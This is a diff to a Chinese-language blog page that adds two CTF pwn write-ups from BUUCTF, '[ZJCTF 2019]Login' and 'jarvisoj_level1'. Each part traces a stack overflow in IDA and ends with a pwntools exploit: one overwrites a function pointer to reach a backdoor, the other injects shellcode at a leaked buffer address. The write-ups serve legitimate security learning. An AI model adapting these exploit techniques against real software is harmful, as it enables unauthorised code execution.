@@ -63,7 +63,7 @@
                                                总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">69.6k</span>
+	总字数 <span class="post-count">70.1k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -163,7 +163,7 @@
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：3.3k字 | 预计阅读时长：15分钟
+    字数：3.8k字 | 预计阅读时长：17分钟
 </div>
         
   
@@ -476,6 +476,59 @@
 
 <p>执行后输入<code>exec 1&gt;&amp;0</code>即可看到shell</p>
 <p><img src="/2024/02/18/buuctf-pwn/image-20240223181807111.png"></p>
+<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224142914592.png"></p>
+<p>存在后门函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224143438793.png"></p>
+<p>64位程序</p>
+<p>运行一下</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224143520778.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224143533236.png"></p>
+<p>看到一个字符串，应该是管理员密码</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224143745848.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224152213872.png"></p>
+<p>password_checker中在验证密码后有一个a1函数，结合汇编来看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224152348101.png"></p>
+<p>应该是这个<code>call rax</code></p>
+<p>在0x4009e2的函数中，当我们输对密码后会调用 <code>**a1()</code>。从**上看a1是函数地址的地址，通过分析发现a1其实是通过栈来保存的地址<br>rax的值是从rdi，main中传参过来的</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224153131343.png"></p>
+<p>rdi是函数的第一个参数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224153326173.png"></p>
+<p>可以看到就是v8，v8是<code>v8 = (void (**)(void))password_checker(v3);</code>传回来的</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224153541681.png"></p>
+<p>可以看到就是参数v2</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224153646206.png"></p>
+<p>即var_18</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224154040614.png"></p>
+<p>进入<code>read_password</code>函数中查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224154251570.png"></p>
+<p><code>fgets(s, 79, stdin);</code>可能溢出</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224154432535.png"></p>
+<p>可以看到输入密码的s的栈下面有var_18，这样就可以利用s溢出覆盖 var_18到shell了</p>
+<p>调试看一下偏移</p>
+<p>在fgets处（0x400D9D）处下断点，并输入</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224160425855.png"></p>
+<p>运行到<code>unsigned __int64 __fastcall password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator()(void (***a1)(void), const char *a2, const char *a3)</code>函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224161613685.png"></p>
+<p>可以看到rdi已被覆盖，计算偏移</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224161719656.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">shell_addr = <span class="number">0x400E88</span></span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;username: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;password: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;2jctf_pa5sw0rd\x00&#x27;</span>   <span class="comment">#strcmp截断 </span></span><br><span class="line">payload = payload.ljust(<span class="number">72</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 补充的“\x00”是因为后续的snprintf，格式化输出会覆盖掉最后执行的地址</span></span><br><span class="line">payload += p64(shell_addr) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224162832928.png"></p>
+<h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240224165922735.png"></p>
+<p>32位程序没有保护</p>
+<p>漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224170149183.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224170541698.png"></p>
+<p>泄露了buf地址，直接将shellcode写入buf之后覆盖返回地址到buf即可</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224170406830.png"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./jar_level1&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">t=p.recvline()</span><br><span class="line">buf_addr=t[<span class="number">12</span>:-<span class="number">2</span>]      <span class="comment">#获取buf地址</span></span><br><span class="line"><span class="built_in">print</span>(buf_addr)</span><br><span class="line">payload=shellcode+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>-<span class="built_in">len</span>(shellcode))+p32(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240224171720968.png"></p>
 
       
 
